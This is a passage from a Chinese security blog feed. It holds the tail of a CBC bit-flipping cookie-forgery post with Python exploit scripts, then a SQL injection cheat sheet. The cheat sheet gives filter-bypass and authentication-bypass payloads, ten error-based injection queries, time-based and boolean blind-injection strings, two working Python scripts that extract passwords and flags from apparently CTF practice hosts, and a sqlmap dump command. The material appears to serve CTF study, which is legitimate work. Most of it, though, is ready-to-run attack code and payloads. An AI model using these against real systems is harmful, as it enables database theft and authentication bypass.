class="hljs-string">'OVvKyLSujW%2BwWSroAUNNaw%3D%3D'</span>)); <span class="hljs-attribute">new_iv</span>=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(0,16): <span class="hljs-attribute">new_iv</span>=new_iv+chr(ord(iv[j]) ^ ord(res[j]) ^ ord(array_seria[0][j]))<span class="hljs-attribute">new_iv</span>=urllib.quote(base64.b64encode(new_iv))<span class="hljs-builtin-name">print</span>(<span class="hljs-string">'new_iv: '</span>+new_iv)</code></pre><h1 id="mochazz学长的python代码"><a href="#mochazz学长的python代码" class="headerlink" title="mochazz学长的python代码"></a>mochazz学长的python代码</h1><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> urllib,base64,requests,reurl = "http://*.*.*.*/index.php"datas = &#123;"username" : "Admin","password" : "admin"&#125;r = requests.post(url,data=datas)cipher = r.cookies.<span class="hljs-keyword">get</span>("cipher")cipher = base64.b64decode(urllib.unquote(cipher))<span class="hljs-keyword">offset</span> = <span class="hljs-number">9</span>new_cipher = cipher[:<span class="hljs-keyword">offset</span>] + chr(ord(cipher[<span class="hljs-keyword">offset</span>])^ord("A")^ord("a")) + cipher[<span class="hljs-keyword">offset</span>+<span class="hljs-number">1</span>:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies["cipher"] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.<span class="hljs-keyword">get</span>(url,cookies=new_cookies)plain = base64.b64decode(re.findall("decode\('(.*)'\)",r2.text)[<span class="hljs-number">0</span>])iv = base64.b64decode(urllib.unquote(new_cookies["iv"]))<span class="hljs-built_in">old</span> = plain[:len(iv)]<span class="hljs-built_in">new</span> = <span class="hljs-string">'a:2:&#123;s:8:"userna'</span>new_iv = "".<span class="hljs-keyword">join</span>([chr(ord(iv[i])^ord(<span class="hljs-built_in">old</span>[i])^ord(<span class="hljs-built_in">new</span>[i])) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">16</span>)])new_cookies["iv"] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.<span class="hljs-keyword">get</span>(url,cookies=new_cookies)print(r3.text)</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2018/05/06/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">CBC字节翻转攻击mochazz</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F#%E5%AF%86%E7%A0%81%E5%9D%97%E9%93%BE%E6%8E%A5%EF%BC%88CBC%EF%BC%89" target="_blank" rel="noopener">分组密码工作模式CBC</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">CBC字节翻转攻击-101Approach</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入备忘录</title>
    <link href="/2019/03/14/sql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2019/03/14/sql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入初探"><a href="#sql注入初探" class="headerlink" title="sql注入初探"></a>sql注入初探</h1><h2 id="1-尝试注入，观察网页回显"><a href="#1-尝试注入，观察网页回显" class="headerlink" title="1.尝试注入，观察网页回显"></a>1.尝试注入，观察网页回显</h2><p><strong>可以用以下语句对一个可能的注入点进行测试</strong><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><strong>通过注入查看服务器返回的信息主要观察是否返回500,且判断是因为sql语句导致的错误，而不会解析错误而导致。</strong><br>方法：</p><blockquote><blockquote></blockquote></blockquote><ol><li>如果 ‘ 导致错误，尝试&#39; 能否成功（因为反斜杠在Mysql中取消了单引号）</li><li>尝试注释掉’就会返回成功消息,如–+</li><li>如果’ 是不允许，比较有效与无效系统变量之间的比较，类似：@@version vs @@version’<br>或在无效函数与有效函数之间比较：类似：SLEP(5) vs @@SLEEP(5)</li><li>如果你的输入在()中，测试input)%23</li><li>如果正常输入只是一个整数，可以尝试减去一些量，查看减法是否有效，类似:id=460-5</li><li>尝试查看偶数量的引号是否会导致成功消息（例如460’’或460-‘’），并且不均匀的数量会导致错误（例如 460’或460-‘’’）。</li></ol><h2 id="2-判断注入点"><a href="#2-判断注入点" class="headerlink" title="2.判断注入点"></a>2.判断注入点</h2><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_input <span class="hljs-keyword">FROM</span> tournament <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> region;<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> tbl_name (col1,col2) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">15</span>,user_input);<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> somelog <span class="hljs-keyword">WHERE</span> texts = <span class="hljs-string">'user_input'</span><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> username = <span class="hljs-string">'$username'</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'$id'</span>;</code></pre><p><strong>猜测sql查询语句</strong><br>可能是<code>where , limit , order by .....</code></p><h2 id="3-判断过滤字符"><a href="#3-判断过滤字符" class="headerlink" title="3.判断过滤字符"></a>3.判断过滤字符</h2><p>绕过过滤，或者使用剩下未过滤字符构造Sql语句<br><strong>异或判断注入过滤</strong></p><p><code>^(length(&#39;union&#39;)&gt;0)</code>，如果union被过滤语句变为<code>^(length(&#39;&#39;)&gt;0)</code>为假，因为^为真。网页正常回显，则union被过滤<br>Example:<code>http://123.206.87.240:9004/1ndex.php?id=1%27^(length(%27union%27)&gt;0)%23</code></p><h2 id="4-构造可脱裤sql语句"><a href="#4-构造可脱裤sql语句" class="headerlink" title="4.构造可脱裤sql语句"></a>4.构造可脱裤sql语句</h2><h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><pre><code class="hljs llvm">注释符 ： #  /* -- <span class="hljs-comment">;%00 反引号</span><span class="hljs-comment">算术运算符： +，-，*，/，DIV，% ，MOD</span><span class="hljs-comment">比较运算符：等于,大于,小于,大于等于,小于等于,不等于(&lt;&gt;),记住不等于是&lt;&gt; </span><span class="hljs-comment">逻辑运算符：and(&amp;&amp;),or(||) , XOR(^), &lt;&lt; , &gt;&gt;,&amp;</span><span class="hljs-comment">空格：%20, %09, %0a, %0b, %0c, %0d, %a0</span></code></pre><h1 id="常用过滤绕过"><a href="#常用过滤绕过" class="headerlink" title="常用过滤绕过"></a>常用过滤绕过</h1><h2 id="绕过单引号"><a href="#绕过单引号" class="headerlink" title="绕过单引号"></a>绕过单引号</h2><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p><code>?id=1+UnIoN+SeLecT+1,2,3--</code></p><h2 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h2><p><code>?id=1+UNunionION+SEselectLECT+1,2,3--</code></p><h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><p><code>?id=1+un/**/ion+se/**/lect+1,2,3--</code></p><h2 id="特殊嵌入绕过"><a href="#特殊嵌入绕过" class="headerlink" title="特殊嵌入绕过"></a>特殊嵌入绕过</h2><p><code>?id=1/*!UnIoN*/SeLecT+1,2,3--</code></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>SQL注入中的宽字节国内最常使用的<code>gbk</code>编码，这种方式主要是绕过<code>addslashes</code>等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入<code>%bf%27</code>时，函数遇到单引号自动转移加入，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p><h2 id="MySQL版本号字符"><a href="#MySQL版本号字符" class="headerlink" title="MySQL版本号字符"></a>MySQL版本号字符</h2><p>Examples:<br><code>UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+</code><br><code>SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);</code><br>这样的查询语句是可以执行的，我理解为类似Python中第一行注释指定解析器一样#!/bin/sh<br>对于小于或等于版本号的语句就会执行<br>例如目前的Mysql版本为5.7.17那么/!50717/及其以下的语句即可执行</p><h2 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a>字符编码绕过</h2><p>前段时间看到ph师傅的博客是讨论mysql字符编码的文章，大概意思如下，原文在这里<br>当出现有以下代码时，指设置了字符编码为utf-8，但并不是全部为utf-8，而在具体的转换过程中会出现意外的情况，具体可以看ph师傅的文章<br>$mysqli-&gt;query(“set names utf8”);<br>在sql查询中<br>test.php?username=admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等</p><h2 id="绕空格"><a href="#绕空格" class="headerlink" title="绕空格"></a>绕空格</h2><h3 id="特殊字符绕过空格"><a href="#特殊字符绕过空格" class="headerlink" title="特殊字符绕过空格"></a>特殊字符绕过空格</h3><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>Example:<br><code>&#39;%0AUNION%0CSELECT%A0NULL%20%23</code></p><h3 id="括号绕过空格"><a href="#括号绕过空格" class="headerlink" title="括号绕过空格"></a>括号绕过空格</h3><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>Example:<br><code>UNION(SELECT(column)FROM(table))</code><br>and/or后插入字符绕过空格<br>任意混合+ – ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）<br><code>SELECT DISTINCT(db) FROM mysql.db WHERE</code>Host<code>=&#39;localhost&#39; and-++-1=1;</code>需要偶数个–<br><code>SELECT DISTINCT(db) FROM mysql.db WHERE</code>Host<code>=&#39;localhost&#39; and!!~~~~!1=1;</code>需要奇数个！<br>其实以下的字符都可以测试<br><img src="./5.png" srcset="/img/loading.gif" alt="">    </p><h3 id="注释符-amp-引号"><a href="#注释符-amp-引号" class="headerlink" title="注释符&amp;引号"></a>注释符&amp;引号</h3><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span>(db) <span class="hljs-keyword">FROM</span> mysql.db <span class="hljs-keyword">WHERE</span> <span class="hljs-string">`Host`</span>=<span class="hljs-string">'localhost'</span> <span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span>;<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span>(db) <span class="hljs-keyword">FROM</span> mysql.db <span class="hljs-keyword">WHERE</span> <span class="hljs-string">`Host`</span>=<span class="hljs-string">'localhost'</span> <span class="hljs-keyword">and</span><span class="hljs-string">"1=1"</span>;</code></pre><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><p>测试用例information_schema.tables<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h2 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h2><p>绕过语句：’=’</p><pre><code class="hljs routeros">select data <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">name</span>=<span class="hljs-string">"="</span>select data <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">false</span>=<span class="hljs-string">"</span><span class="hljs-string">select data from users where 0=0</span></code></pre><h2 id="绕过语句：’-‘"><a href="#绕过语句：’-‘" class="headerlink" title="绕过语句：’-‘"></a>绕过语句：’-‘</h2><pre><code class="hljs routeros">select data <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">name</span>=<span class="hljs-string">''</span>-''select data <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">name</span>=0-0select data <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">0</span>=0</code></pre><p>比如登录的时候需要输入email和passwd，可以这样输入<br>email=’’&amp;password=’’</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><pre><code class="hljs sql">' or 1=true' or 1<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-string">'a'</span>=<span class="hljs-string">'b'</span>=<span class="hljs-string">'c'</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> (<span class="hljs-string">'a'</span>=<span class="hljs-string">'b'</span>)=<span class="hljs-string">'c'</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> (<span class="hljs-literal">false</span>)=<span class="hljs-string">'c'</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> (<span class="hljs-number">0</span>)=<span class="hljs-string">'c'</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> (<span class="hljs-number">0</span>)=<span class="hljs-number">0</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-literal">true</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema= <span class="hljs-keyword">database</span>()<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name= <span class="hljs-keyword">database</span>()</code></pre><h1 id="实战正则过滤绕过"><a href="#实战正则过滤绕过" class="headerlink" title="实战正则过滤绕过"></a>实战正则过滤绕过</h1><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="MID（）—从文本字段中提取字符"><a href="#MID（）—从文本字段中提取字符" class="headerlink" title="MID（）—从文本字段中提取字符"></a>MID（）—从文本字段中提取字符</h2><p><code>SELECT MID(column_name,start[,length]) FROM table_name;</code><br>column_name 必需。要提取字符的字段。<br>start 必需。规定开始位置（起始值是 1）。<br>length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h2 id="limit-—返回前几条或者中间某几行数据"><a href="#limit-—返回前几条或者中间某几行数据" class="headerlink" title="limit()—返回前几条或者中间某几行数据"></a>limit()—返回前几条或者中间某几行数据</h2><p><code>select * from table limit m,n;</code><br>其m指记录始index0始表示第条记录 n指第m+1条始取n条<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h2 id="concat、concat-ws、group-concat"><a href="#concat、concat-ws、group-concat" class="headerlink" title="concat、concat_ws、group_concat"></a>concat、concat_ws、group_concat</h2><p>MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h2 id="Count-—聚集函数，统计元祖的个数"><a href="#Count-—聚集函数，统计元祖的个数" class="headerlink" title="Count()—聚集函数，统计元祖的个数"></a>Count()—聚集函数，统计元祖的个数</h2><p><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h2 id="rand-—用于产生一个0-1的随机数"><a href="#rand-—用于产生一个0-1的随机数" class="headerlink" title="rand()—用于产生一个0~1的随机数"></a>rand()—用于产生一个0~1的随机数</h2><p><img src="./13.png" srcset="/img/loading.gif" alt=""></p><h2 id="floor-—向下取整"><a href="#floor-—向下取整" class="headerlink" title="floor()—向下取整"></a>floor()—向下取整</h2><p><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h2 id="group-by—依据我们想要的规则对结果进行分组"><a href="#group-by—依据我们想要的规则对结果进行分组" class="headerlink" title="group by—依据我们想要的规则对结果进行分组"></a>group by—依据我们想要的规则对结果进行分组</h2><p>safe_mode模块会对使用造成影响<br><img src="./15.png" srcset="/img/loading.gif" alt=""></p><h2 id="length-—返回字符串的长度"><a href="#length-—返回字符串的长度" class="headerlink" title="length()—返回字符串的长度"></a>length()—返回字符串的长度</h2><p><img src="./16.png" srcset="/img/loading.gif" alt=""></p><h2 id="Substr-—截取字符串-三个参数-（所要截取字符串，截取的位置，截取的长度）"><a href="#Substr-—截取字符串-三个参数-（所要截取字符串，截取的位置，截取的长度）" class="headerlink" title="Substr()—截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）"></a>Substr()—截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）</h2><p><img src="./17.png" srcset="/img/loading.gif" alt=""></p><h2 id="Ascii-—返回字符串的ascii码"><a href="#Ascii-—返回字符串的ascii码" class="headerlink" title="Ascii()—返回字符串的ascii码"></a>Ascii()—返回字符串的ascii码</h2><p><img src="./18.png" srcset="/img/loading.gif" alt=""></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre><code class="hljs angelscript">sleep(<span class="hljs-number">5</span>)和benchmark(<span class="hljs-number">1000000</span>,sha(<span class="hljs-number">1</span>))select * <span class="hljs-keyword">from</span> users where id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ord(substring(version()<span class="hljs-keyword">from</span>(<span class="hljs-number">1</span>)<span class="hljs-keyword">for</span>(<span class="hljs-number">1</span>)))=<span class="hljs-number">53</span>,benchmark(<span class="hljs-number">10000000</span>,sha(<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>);</code></pre><p><img src="./19.png" srcset="/img/loading.gif" alt=""></p><p><code>select * from users where id = 1 or if(ord(substring(version()from(1)for(1)))=53,sleep(2),1);</code><br><img src="./20.png" srcset="/img/loading.gif" alt=""></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>常用拼接</p><pre><code class="hljs bash"><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>+<span class="hljs-string">''</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>-<span class="hljs-string">''</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>*<span class="hljs-string">''</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>%1<span class="hljs-comment">#</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>/6<span class="hljs-comment">#</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>&amp;0<span class="hljs-comment">#'</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>|0<span class="hljs-comment">#'</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>^0<span class="hljs-comment">#'</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>=0&lt;=&gt;1<span class="hljs-comment">#'</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>=0&lt;&gt;0<span class="hljs-comment">#'</span><span class="hljs-built_in">where</span> username=<span class="hljs-string">''</span>&gt;-1<span class="hljs-comment">#</span></code></pre><pre><code class="hljs routeros">1. select <span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=2,'true','false');<span class="hljs-attribute">1</span>=2可以更换为判断语句2. find_in_set函数，如果相同则返回1 不同则返回0select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where id = 1 <span class="hljs-keyword">and</span> find_in_set(53,ord(substr(version()<span class="hljs-keyword">from</span>(1)<span class="hljs-keyword">for</span>(1))));3. strcmp函数，如果两个值相同则返回0select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where id = 1 <span class="hljs-keyword">and</span> strcmp(54,ord(substr(version()<span class="hljs-keyword">from</span>(1)<span class="hljs-keyword">for</span>(1))));select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where id = 1 <span class="hljs-keyword">and</span> strcmp(54,ord(substr(version(),1,1)));4. admin<span class="hljs-string">'-(ascii(mid(REVERSE(MID((passwd)from(-"+str(i)+")))from(-1)))="+str(ord(j))+")-</span></code></pre><h1 id="十个报错注入"><a href="#十个报错注入" class="headerlink" title="十个报错注入"></a>十个报错注入</h1><h2 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a>1.floor()</h2><p><code>select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code><br><img src="./21.png" srcset="/img/loading.gif" alt=""></p><h2 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h2><p><code>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code><br><img src="./22.png" srcset="/img/loading.gif" alt=""></p><h2 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3.updatexml()"></a>3.updatexml()</h2><p><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code><br><img src="./23.png" srcset="/img/loading.gif" alt=""></p><h2 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4.geometrycollection()"></a>4.geometrycollection()</h2><p><code>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code><br><img src="./24.png" srcset="/img/loading.gif" alt=""></p><h2 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5.multipoint()"></a>5.multipoint()</h2><p><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code><br><img src="./25.png" srcset="/img/loading.gif" alt=""></p><h2 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6.polygon()"></a>6.polygon()</h2><p><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code><br><img src="./26.png" srcset="/img/loading.gif" alt=""></p><h2 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7.multipolygon()"></a>7.multipolygon()</h2><p><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code><br><img src="./27.png" srcset="/img/loading.gif" alt=""></p><h2 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8.linestring()"></a>8.linestring()</h2><p><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code><br><img src="./28.png" srcset="/img/loading.gif" alt=""></p><h2 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9.multilinestring()"></a>9.multilinestring()</h2><p><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code><br><img src="./29.png" srcset="/img/loading.gif" alt=""></p><h2 id="10-exp"><a href="#10-exp" class="headerlink" title="10.exp()"></a>10.exp()</h2><p><code>select * from test where id=1 and exp(~(select * from(select user())a));</code><br><img src="./30.png" srcset="/img/loading.gif" alt=""></p><h1 id="布尔盲注脚本"><a href="#布尔盲注脚本" class="headerlink" title="布尔盲注脚本"></a>布尔盲注脚本</h1><pre><code class="hljs lasso">Python<span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">"http://123.206.87.240:8007/web2/login.php"</span><span class="hljs-keyword">header</span>=&#123;<span class="hljs-string">'Host'</span>:<span class="hljs-string">'123.206.87.240:8007'</span>,<span class="hljs-string">'Content-Length'</span>: <span class="hljs-string">'22'</span>,<span class="hljs-string">'Cache-Control'</span>: <span class="hljs-string">'max-age=0'</span>,<span class="hljs-string">'Origin'</span>: <span class="hljs-string">'http://123.206.87.240:8007'</span>,<span class="hljs-string">'Upgrade-Insecure-Requests'</span>: <span class="hljs-string">'1'</span>,<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/x-www-form-urlencoded'</span>,<span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'</span>,<span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,<span class="hljs-string">'Referer'</span>: <span class="hljs-string">'http://123.206.87.240:8007/web2/index.php'</span>,<span class="hljs-string">'Accept-Encoding'</span>: <span class="hljs-string">'gzip, deflate'</span>,<span class="hljs-string">'Accept-Language'</span>: <span class="hljs-string">'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7'</span>,<span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'PHPSESSID=gqsuf2o9h229kfvt9dokto1mr0u5slk6'</span>,<span class="hljs-string">'Connection'</span>: <span class="hljs-string">'close'</span>&#125;a=<span class="hljs-string">'0123456789abcdef'</span>con=<span class="hljs-string">"username error!!@_@"</span>password = <span class="hljs-string">""</span>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):    for j <span class="hljs-keyword">in</span> a:        payload = <span class="hljs-string">"admin'-(ascii(mid(REVERSE(MID((passwd)from(-"</span>+str(i)+<span class="hljs-string">")))from(-1)))="</span>+str(ord(j))+<span class="hljs-string">")-'"</span>#payload = <span class="hljs-string">"admin'^(ascii(mid(REVERSE(MID((password)from(-"</span>+str(i)+<span class="hljs-string">")))from(-1)))-"</span>+str(ord(j))+<span class="hljs-string">")#"</span> 过滤等号        <span class="hljs-built_in">data</span> = &#123;            <span class="hljs-string">'uname'</span>: payload,            <span class="hljs-string">'passwd'</span>: <span class="hljs-string">'sky'</span>        &#125;        r = requests.post(url=url,headers=<span class="hljs-keyword">header</span>,<span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>)        #print(r.content)        <span class="hljs-keyword">if</span> con <span class="hljs-keyword">in</span> r.content:            password += j            print(password)            break<span class="hljs-comment">//ord将字符转换成ascii值</span></code></pre><p><img src="./32.png" srcset="/img/loading.gif" alt=""></p><h1 id="消毒-的时间盲注"><a href="#消毒-的时间盲注" class="headerlink" title="消毒,的时间盲注"></a>消毒,的时间盲注</h1><p>条件消毒了,号<br>sql与if语句有相同作用语句为<br><code>select case when xxx then xxx else xxx end;</code></p><pre><code class="hljs sql"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>import requestsimport sys<span class="hljs-comment"># 基于时间的盲注，过滤了逗号 ,</span>sql = "127.0.0.1'+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag) <span class="hljs-keyword">from</span> &#123;<span class="hljs-number">0</span>&#125; <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">'&#123;1&#125;'</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))<span class="hljs-comment">-- +"</span><span class="hljs-keyword">url</span> = <span class="hljs-string">'http://123.206.87.240:8002/web15/'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):    print(<span class="hljs-string">'正在猜测：'</span>, <span class="hljs-keyword">str</span>(i))    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:            sys.exit(<span class="hljs-number">0</span>)        sqli = sql.format(i, <span class="hljs-keyword">chr</span>(ch))        <span class="hljs-comment"># print(sqli)</span>        header = &#123;            <span class="hljs-string">'X-Forwarded-For'</span>: sqli        &#125;        try:            html = requests.get(<span class="hljs-keyword">url</span>, headers=header, <span class="hljs-keyword">timeout</span>=<span class="hljs-number">3</span>)        <span class="hljs-keyword">except</span>:            flag += <span class="hljs-keyword">chr</span>(ch)            print(flag)            break</code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>payload:<br><code>sqlmap -r ~/1.txt -v 3 --technique T --level 3 --risk 3 --tamper if2casewhen,ifnull2casewhenisnull,commalessmid,commalesslimit -D web15 -T flag --dump MySQL --dbs</code></p><p><img src="./31.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/86021" target="_blank" rel="noopener">MySQL False注入及技巧总结</a></p><p><a href="https://www.anquanke.com/post/id/85936" target="_blank" rel="noopener">MySQL 注入攻击与防御</a></p><p><a 